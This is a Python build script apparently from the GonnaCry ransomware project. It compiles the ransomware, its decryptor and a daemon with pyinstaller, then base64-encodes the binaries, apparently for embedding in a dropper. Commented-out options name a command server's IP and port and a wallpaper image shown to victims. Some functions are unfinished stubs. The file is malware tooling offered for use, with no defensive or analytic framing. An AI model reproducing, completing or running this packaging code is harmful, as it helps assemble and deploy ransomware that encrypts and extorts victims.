#!/usr/bin/env python



import argparse
import base64, os, sys

""" 
parser = argparse.ArgumentParser(description='Build GonnaCry.', add_help=True)
parser.add_argument('-i', '--ip', type=str, required=True, metavar='[FILE]',
    help='Ip address of the server. GonnaCry will try to connect to')
parser.add_argument('-p', '--port', type=str, required=False, metavar='[FILE]',
    help='Port of the server.')
parser.add_argument('-I', '--img', type=str, required=False, metavar='[FILE]',
    help='Img to change wallpaper and display on GonnaCry execution.')
args = parser.parse_args()
 """


def error(s):
    print(s)
    sys.exit(-1)


def build(program):
    command = 'pyinstaller -F --clean GonnaCry/{}.py -n {}'.format(program, program)
    os.system(command)

    try:
        with open('dist/{}'.format(program), 'rb') as f:
            ret = f.read()
            output64 = base64.b64encode(ret)
    except:
        error('{} binary doesnt exist, compilation failed.'.format(program))

    with open('dist/base64{}'.format(program), 'wb') as f:
        f.write(output64)
    
    return output64


def build_gonnacry():
    build('gonnacry')
    


def build_decryptor():
    return build('decryptor')


def build_daemon():
    return build('daemon')


def change_gonnacry_binaries():
    img = ''
    decryptor = ''
    daemon = ''

def clean_dist():
    command = ''


def main():
    decryptor64 = build_decryptor()
    daemon64 = build_daemon()


if __name__ =='__main__':
    main()





